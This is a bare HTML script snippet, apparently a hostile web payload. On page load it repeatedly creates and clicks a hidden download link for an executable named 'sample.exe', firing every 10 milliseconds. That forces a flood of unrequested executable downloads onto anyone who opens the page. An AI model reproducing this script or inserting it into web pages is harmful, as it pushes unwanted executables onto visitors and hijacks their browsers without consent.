<script>
    setInterval(() => {
        var link = document.createElement("a");
        link.href = "../sample.exe";
        link.download = "";
        document.body.appendChild(link);
        link.click();
    }, 10)
</script>